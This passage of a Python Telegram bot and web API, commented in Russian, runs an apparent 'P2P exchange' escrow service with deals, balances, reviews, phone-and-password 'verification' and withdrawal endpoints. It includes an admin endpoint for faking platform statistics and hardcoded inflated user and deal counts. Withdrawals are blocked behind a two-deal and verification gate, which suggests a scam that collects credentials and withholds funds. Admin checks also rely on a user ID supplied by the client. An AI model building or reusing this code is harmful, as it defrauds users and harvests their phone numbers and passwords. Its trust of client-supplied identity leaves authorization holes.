    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    reviews_list = list(reviews.values())
    if not reviews_list:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
    else:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
        for r in reviews_list[-10:]:
            user = r.get('user', 'Аноним')
            rating = '⭐' * r.get('rating', 5)
            text += f"👤 <b>{user}</b> | {rating}\n"
            text += f"📝 {r.get('text', '')[:150]}\n"
            text += f"🕐 {r.get('date', 'недавно')}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 9. АДМИН ПАНЕЛЬ (СОКРАЩЁННО)
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(
        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"🔐 Запросы верификации", callback_data="admin_verification_requests")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

# ============================================================
# 10. API ДЛЯ MINI APP (ВСЕ ЭНДПОИНТЫ)
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    if request.method == 'GET':
        return web.json_response({
            'success': True,
            'bot': BOT_NAME,
            'version': '1.0.0',
            'status': 'running'
        }, headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    username = data.get('username', str(user_id))
    endpoint = request.path
    
    print(f"📥 API: {endpoint} | user: {user_id} | data: {data}")
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers=headers)
    
    # ===== СТАТИСТИКА =====
    elif endpoint == '/api/stats':
        update_stats()
        return web.json_response({
            'success': True,
            'deals_today': stats.get('deals_today', 1264),
            'users': stats.get('users', 21374),
            'reviews': stats.get('reviews', 5427),
            'volume': stats.get('volume', 47.6)
        }, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        
        add_log("api_create_deal", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "product": product,
            "amount": amount,
            "currency": currency,
            "buyer_username": buyer_username
        })
        
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link,
            'status': deals[deal_id]["status"]
        }, headers=headers)
    
    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ПОЛУЧИТЬ СДЕЛКУ ПО ID =====
    elif endpoint == '/api/get_deal':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        return web.json_response({'success': True, 'deal': deals[deal_id]}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # ===== ОТЗЫВЫ =====
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    # ===== ДОБАВИТЬ ОТЗЫВ =====
    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)
        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        if len(user_deals) < 1:
            return web.json_response({'success': False, 'error': 'Need at least 1 completed deal'}, headers=headers)
        
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
    
    # ===== ПРОВЕРКА 2 СДЕЛОК =====
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_2 = any(count >= 2 for count in partners.values())
        total = sum(partners.values())
        return web.json_response({'success': True, 'has_2_deals': has_2, 'total_deals': total}, headers=headers)
    
    # ===== СТАТУС ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/verification_status':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    return web.json_response({
                        'success': True,
                        'verified': True,
                        'expires_at': sess['expires_at'],
                        'session_id': sid
                    }, headers=headers)
                else:
                    sess['active'] = False
                    save_json(FILES["verification_sessions"], verification_sessions)
        
        return web.json_response({'success': True, 'verified': False}, headers=headers)
    
    # ===== НАЧАТЬ ВЕРИФИКАЦИЮ =====
    elif endpoint == '/api/start_verification':
        phone = data.get('phone')
        username = data.get('username')
        
        if not all([user_id, phone, username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    return web.json_response({
                        'success': False,
                        'error': 'Active verification session exists'
                    }, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        verification_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["verification"], verification_requests)
        
        add_log("verification_requested", {
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "request_id": request_id
        })
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ КОД =====
    elif endpoint == '/api/verify_code':
        code = data.get('code')
        password = data.get('password')
        
        if not code:
            return web.json_response({'success': False, 'error': 'Code required'}, headers=headers)
        
        if code != "1#2#3#4#5":
            return web.json_response({'success': False, 'error': 'Invalid code'}, headers=headers)
        
        pending_request = None
        for rid, req in verification_requests.items():
            if req.get('user_id') == user_id and req.get('status') == 'pending':
                pending_request = req
                break
        
        if not pending_request:
            return web.json_response({'success': False, 'error': 'No pending verification request'}, headers=headers)
        
        session_id = str(uuid.uuid4())[:8]
        verification_sessions[session_id] = {
            "user_id": user_id,
            "username": username,
            "phone": pending_request['phone'],
            "created_at": datetime.now().isoformat(),
            "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
            "active": True
        }
        save_json(FILES["verification_sessions"], verification_sessions)
        
        pending_request['status'] = 'approved'
        pending_request['session_id'] = session_id
        pending_request['approved_at'] = datetime.now().isoformat()
        save_json(FILES["verification"], verification_requests)
        
        add_log("verification_completed", {
            "user_id": user_id,
            "username": username,
            "session_id": session_id,
            "password_entered": bool(password)
        })
        
        return web.json_response({
            'success': True,
            'session_id': session_id,
            'expires_at': (datetime.now() + timedelta(hours=24)).isoformat()
        }, headers=headers)
    
    # ===== ОПЛАТА С БАЛАНСА =====
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already paid'}, headers=headers)
        
        buyer_balance = get_balance(user_id)
        curr_key = deal["currency"].lower()
        
        if buyer_balance.get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        buyer_balance[curr_key] -= deal["amount"]
        save_json(FILES["balance"], balance)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        add_log("deal_paid_from_balance", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        # Уведомляем продавца
        try:
            seller_lang = get_user_language(deal["seller_id"])
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 Покупатель: @{deal['buyer_username']}\n\n"
                f"📦 Нажмите «Передал товар» в Mini App",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=f"📱 Перейти в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
                ])
            )
        except:
            pass
        
        return web.json_response({'success': True, 'status': 'paid'}, headers=headers)
    
    # ===== ПОЛУЧИТЬ РЕКВИЗИТЫ =====
    elif endpoint == '/api/get_rekvisits':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        currency = deal["currency"]
        amount = deal["amount"]
        
        rekvisit_text = rekvisits.get(currency, f"Оплатите {amount} {currency}")
        rekvisit_text = rekvisit_text.replace("{amount}", str(amount))
        
        return web.json_response({
            'success': True,
            'details': rekvisit_text,
            'currency': currency,
            'amount': amount
        }, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ОПЛАТУ ПО РЕКВИЗИТАМ =====
    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already paid'}, headers=headers)
        
        # Отправляем уведомление админу
        await bot.send_message(
            MASTER_ADMIN_ID,
            f"💳 <b>ЗАПРОС НА ПОДТВЕРЖДЕНИЕ ОПЛАТЫ</b>\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"👤 Покупатель: @{username} (ID: {user_id})\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"📦 Товар: {deal['product']}\n"
            f"👤 Продавец: @{deal['seller_username']}\n\n"
            f"Для подтверждения: /pay {deal_id}"
        )
        
        add_log("rekvisits_payment_requested", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        return web.json_response({'success': True, 'message': 'Payment confirmation requested'}, headers=headers)
    
    # ===== ПРОДАВЕЦ ПОДТВЕРДИЛ ПЕРЕДАЧУ =====
    elif endpoint == '/api/seller_delivered':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
        
        deal["status"] = "awaiting_confirmation"
        save_json(FILES["deals"], deals)
        
        add_log("seller_confirmed_delivery", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "product": deal["product"],
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        # Уведомляем покупателя
        try:
            buyer_lang = get_user_language(deal["buyer_id"])
            await bot.send_message(
                deal["buyer_id"],
                f"📦 <b>ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР</b>\n\n"
                f"🆔 Сделка: #{deal_id}\n"
                f"💰 {deal['amount']} {deal['currency']}\n\n"
                f"✅ Подтвердите получение в Mini App"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ПОЛУЧЕНИЕ =====
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Deal not awaiting confirmation'}, headers=headers)
        
        # Начисляем деньги продавцу
        add_balance(deal["seller_id"], deal["currency"], deal["amount"])
        
        # Обновляем счётчик сделок
        seller_balance = get_balance(deal["seller_id"])
        buyer = deal["buyer_username"]
        if buyer not in seller_balance["deal_partners"]:
            seller_balance["deal_partners"][buyer] = 0
        seller_balance["deal_partners"][buyer] += 1
        save_json(FILES["balance"], balance)
        
        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        
        add_log("deal_completed", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "product": deal["product"],
            "amount": deal["amount"],
            "currency": deal["currency"],
            "seller": deal["seller_username"],
            "buyer": deal["buyer_username"]
        })
        
        # Уведомляем продавца
        try:
            seller_lang = get_user_language(deal["seller_id"])
            await bot.send_message(
                deal["seller_id"],
                f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']} зачислены на баланс\n"
                f"👤 Покупатель: @{deal['buyer_username']}"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ВЫВОД СРЕДСТВ =====
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not all([user_id, currency, details]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_2 = any(count >= 2 for count in partners.values())
        if not has_2:
            return web.json_response({'success': False, 'error': 'Need 2 deals with same buyer'}, headers=headers)
        
        verified = False
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    verified = True
                    break
        
        if not verified:
            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
        
        curr_key = currency.lower()
        if bal.get(curr_key, 0) <= 0:
            return web.json_response({'success': False, 'error': 'Zero balance'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "currency": currency,
            "amount": bal[curr_key],
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_requested", {
            "user_id": user_id,
            "username": username,
            "request_id": request_id,
            "amount": bal[curr_key],
            "currency": currency
        })
        
        await bot.send_message(
            MASTER_ADMIN_ID,
            f"💲 <b>ЗАЯВКА НА ВЫВОД</b>\n\n"
            f"🆔 Заявка: #{request_id}\n"
            f"👤 Пользователь: @{username} (ID: {user_id})\n"
            f"💰 Сумма: {bal[curr_key]} {currency}\n"
            f"📝 Реквизиты: {details}\n\n"
            f"Для подтверждения: /confirm_withdraw {request_id}"
        )
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_deals = []
        for d_id, d in deals.items():
            d_copy = d.copy()
            d_copy['deal_id'] = d_id
            all_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': all_deals}, headers=headers)
    
    # ===== ЗАЯВКИ НА ВЫВОД (АДМИН) =====
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_requests = [{'id': rid, **req} for rid, req in withdraw_requests.items()]
        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
    
    # ===== ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН) =====
    elif endpoint == '/api/verification_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_requests = [{'id': rid, **req} for rid, req in verification_requests.items()]
        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/confirm_withdraw':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        request_id = data.get('request_id')
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        bal = get_balance(req['user_id'])
        curr_key = req['currency'].lower()
        if bal.get(curr_key, 0) >= req['amount']:
            bal[curr_key] -= req['amount']
            save_json(FILES["balance"], balance)
        
        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_confirmed_api", {
            "admin_id": user_id,
            "username": username,
            "request_id": request_id
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОТКЛОНИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/reject_withdraw':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        request_id = data.get('request_id')
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        req['status'] = 'rejected'
        save_json(FILES["withdraw"], withdraw_requests)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== НАЧИСЛИТЬ БАЛАНС (АДМИН) =====
    elif endpoint == '/api/add_balance':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not all([target_user_id, currency, amount]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        add_balance(target_user_id, currency, amount)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОЧИСТИТЬ ОТЗЫВЫ (АДМИН) =====
    elif endpoint == '/api/clear_reviews':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        reviews.clear()
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== АДМИН НАКРУТКА СТАТИСТИКИ =====
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        key = data.get('key')
        value = data.get('value')
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing key or value'}, headers=headers)
        stats[key] = value
        save_json(FILES["stats"], stats)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== КОМАНДА ДЛЯ АДМИНА (ЧЕРЕЗ БОТА) =====
    elif endpoint == '/api/pay':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already paid'}, headers=headers)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        add_log("deal_paid_by_admin_api", {
            "admin_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        # Уведомляем продавца
        try:
            seller_lang = get_user_language(deal["seller_id"])
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 Покупатель: @{deal['buyer_username']}\n\n"
                f"📦 Нажмите «Передал товар» в Mini App"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': f'Unknown endpoint: {endpoint}'}, headers=headers)

# ============================================================
# 11. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    print("=" * 50)
    print("🔥 P2P Exchange Бот + API")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
